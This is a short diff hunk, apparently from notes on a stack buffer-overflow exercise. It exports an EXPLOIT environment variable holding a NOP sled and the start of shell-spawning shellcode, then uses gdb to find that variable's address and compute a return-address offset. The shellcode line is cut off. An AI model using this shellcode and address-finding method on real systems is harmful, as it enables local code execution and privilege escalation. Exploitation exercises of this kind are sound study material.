@@ -43,8 +43,6 @@ export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x
 0xffffd74a:      "EXPLOIT=<...>"  
   
 adresse exploit: 0xffffd74a  
-(gdb) p/d 0xffffd74a+200  
-$1 = 4294957074  
   
 (gdb) p/x 0xffffd74a+200  
 $2 = 0xffffd812  
